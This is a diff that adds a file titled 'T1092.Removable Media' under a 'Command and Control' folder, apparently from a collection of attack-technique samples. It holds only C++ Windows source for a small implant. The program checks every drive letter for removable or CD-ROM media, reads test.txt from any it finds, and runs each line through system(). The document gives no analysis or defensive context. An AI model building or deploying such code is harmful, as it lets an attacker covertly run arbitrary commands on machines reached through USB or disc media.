@@ -1,0 +1,75 @@
+---
+title: "T1092.Removable Media"
+folder: "12. Command and Control"
+---
+
+
+
+
+
+#include <iostream>
+#include <fstream>
+#include <Windows.h>
+#include <filesystem>
+#include <string>
+#include <sstream>
+
+
+bool IsDriveRemovable(const std::wstring& drivePath) {
+    UINT driveType = GetDriveTypeW(drivePath.c_str());
+    if (driveType == DRIVE_REMOVABLE) {
+        return true;
+    }
+    else if (driveType == DRIVE_CDROM) {
+        return true;
+    }
+    else {
+        return false;
+    }
+}
+
+bool ExecuteCommandsFromFile(const std::wstring& filePath) {
+    std::ifstream file(filePath);
+    if (!file.is_open()) {
+        std::cerr << "Nie można otworzyć pliku do odczytu.\n";
+        return false;
+    }
+
+    std::string line;
+    while (std::getline(file, line)) {
+        if (!line.empty()) {
+            system(line.c_str());
+        }
+    }
+
+    file.close();
+    return true;
+}
+
+bool ReadAndExecuteCommandsFromRemovableDrive() {
+    for (wchar_t driveLetter = L'A'; driveLetter <= L'Z'; ++driveLetter) {
+        std::wstring drivePath = std::wstring(1, driveLetter) + L":\\";
+
+        if (IsDriveRemovable(drivePath)) {
+            std::wstring filePath = drivePath + L"test.txt";
+            try {
+                if (std::filesystem::exists(filePath)) {
+                    if (ExecuteCommandsFromFile(filePath)) {
+                        return true;
+                    }
+                    else {
+                        return false;
+                    }
+                }
+            }
+            catch (const std::filesystem::filesystem_error& e) {}
+        }
+    }
+    return false;
+}
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    ReadAndExecuteCommandsFromRemovableDrive();
+
+    return 0;
+}
